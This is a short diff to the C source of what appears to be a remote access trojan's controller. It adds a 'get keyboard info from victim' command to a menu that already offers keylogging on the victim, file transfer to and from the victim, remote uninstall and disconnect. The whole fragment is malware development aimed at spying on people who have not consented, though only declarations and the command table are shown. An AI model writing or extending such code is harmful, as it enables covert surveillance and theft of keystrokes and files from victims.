@@ -17,6 +17,7 @@ typedef struct {
 void cmd_disconnect(struct server_options * server_options);
 void cmd_uninstall(struct server_options * server_options);
 void cmd_start_keylogger(struct server_options * server_options);
+void cmd_get_keyboards(struct server_options * server_options);
 void cmd_stop_keylogger(struct server_options * server_options);
 void cmd_transfer_file(struct server_options * server_options);
 void cmd_receive_file(struct server_options * server_options);
@@ -32,6 +33,7 @@ static const menu_command_t g_menu_commands[] = {
     { "q", "Disconnect from the victim",            cmd_disconnect},
     { "u", "Uninstall from the victim",             cmd_uninstall },
     { "k", "Start the keylogger on the victim",     cmd_start_keylogger },
+    { "g", "Get keyboard info from victim",         cmd_get_keyboards },
     { "s", "Stop the keylogger on the victim",      cmd_stop_keylogger },
     { "t", "Transfer a file to the victim",         cmd_transfer_file },
     { "r", "Transfer a file from the victim",       cmd_receive_file },
